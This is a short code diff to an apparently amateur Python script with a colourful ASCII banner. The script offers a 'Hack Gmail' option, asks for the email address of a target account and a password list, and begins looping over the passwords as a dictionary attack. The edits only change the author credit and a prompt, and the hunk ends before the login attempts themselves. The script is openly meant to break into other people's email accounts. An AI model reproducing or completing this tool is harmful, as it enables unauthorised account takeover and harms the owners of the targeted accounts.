@@ -7,7 +7,7 @@ print(" \033[01;33m ____    __  __   ___      ___    __ __  __  __              
 print(" \033[01;33m/   __\ |  \| | /  _  \  /  _  \ |  o  \|  \|  |")
 print(" \033[01;33m\__   \ |     ||  (_)  ||  (_)  ||   __/ \__   |")
 print(" \033[01;33m\_____/ |_|\__| \_____/  \_____/ |__|   <______/ ")
-print("\033[01;34m                  By Matrix karimo Slimani .============>>")
+print("\033[01;34m                  By Matrix Badro karimo .============>>")
 print("                                                         ")
 print("\033[01;32m[01] \033[01;34mHack Gmail")
 number = input("\033[01;32mTybe Your Number Please .... :")
@@ -23,7 +23,7 @@ else:
         print("Error")
 
 user = input("\033[01;33m[+] Email That you want to hack ===> :")
-passwfile = input("\033[01;33m[+] 1\033[01;34mSelect a password list :")
+passwfile = input("\033[01;33m[+] \033[01;34mSelect a password list :")
 passwfile = open(passwfile, "r")
 
 for password in passwfile:
